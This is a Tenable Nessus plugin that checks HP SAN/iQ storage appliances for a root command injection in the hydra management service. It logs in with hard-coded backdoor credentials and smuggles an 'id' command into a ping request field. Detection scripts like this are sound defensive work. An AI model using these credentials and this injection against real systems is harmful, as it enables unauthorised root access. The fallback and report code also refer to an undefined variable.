#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59330);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/10/07 15:36:47 $");

  script_cve_id("CVE-2012-4361");
  script_bugtraq_id(55132);
  script_osvdb_id(82087);
  script_xref(name:"TRA", value:"TRA-2011-12");
  script_xref(name:"EDB-ID", value:"18893");
  script_xref(name:"EDB-ID", value:"18901");

  script_name(english:"HP SAN/iQ < 9.5 Root Shell Command Injection");
  script_summary(english:"Attempts to inject a shell command");

  script_set_attribute(attribute:"synopsis", value:
"A management service on the remote host has a command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of SAN/iQ running on the remote host has a command
injection vulnerability. The hydra service, used for remote management
and configuration, does not properly sanitize untrusted input. A
remote attacker could exploit this to execute arbitrary commands as
root. Authentication is required, but can be bypassed easily by using
default, hard-coded credentials.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2011-12");
  script_set_attribute(attribute:"see_also", value:"http://www.agarri.fr/blog/archives/2012/02/index.html");
  # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?loc=en_US&id=958
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?233561e2");
  # http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?64450dd1");
  script_set_attribute(attribute:"solution", value:"Upgrade to HP SAN/iQ 9.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP StorageWorks P4000 Virtual SAN Appliance Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/11/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/11/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:san/iq");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("hp_saniq_hydra_detect.nbin");
  script_require_ports("Services/hydra_saniq", 13838);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('byte_func.inc');
include('hp_saniq_hydra.inc');

port = get_service(svc:"hydra_saniq", default:13838, exit_on_fail:TRUE);

# the exploit involves logging in with a hard-coded password
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# try logging in with backdoor login account
login_res = hp_hydra_login(socket:soc,
                           port:port,
                           username:'global$agent',
                           password:'L0CAlu53R',
                           version:"9.5.0",
                           exit_on_fail:TRUE);

# the host is running a newer version and is not affected
if (login_res == HP_HYDRA_LOGIN_CLIENT_TOO_OLD)
{
  close(soc);
  audit(AUDIT_LISTEN_NOT_VULN, "HP SanIQ Hydra Service", port);
}

# device may be affected, but our backdoor login failed,
# so we can't attempt to exploit it
if (login_res != HP_HYDRA_LOGIN_OK)
{
  close(soc);
  exit(0, 'Unable to login to HP SanIQ Hyrda Service on port ' + port + ' using default credentials.');
}

shell_cmd = 'id';
ping_cmd = 'get:/lhn/public/network/ping/127.0.0.1/|' + shell_cmd + ' #/64/5/';

res = hp_hydra_run_command(socket:soc, port:port, cmd:ping_cmd, exit_on_fail:TRUE);

# older versions appear to invoke the ping command differently
if ('incorrect number of parameters specified' >< res)
{
  ping_cmd = 'get:/lhn/public/network/ping/127.0.0.1/|' + cmd + ' #/';
  res = hp_hydra_run_command(socket:soc, port:port, cmd:ping_cmd, exit_on_fail:TRUE);
}

close(soc);

if (!egrep(string:res, pattern:'uid=[0-9]+.*gid=[0-9]+.*'))
  audit(AUDIT_HOST_NOT, 'affected');

if (report_verbosity > 0)
{
  res -= 'OK:';
  report = '\nNessus executed the "' + cmd + '" command, which returned :\n\n' + chomp(res) + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);

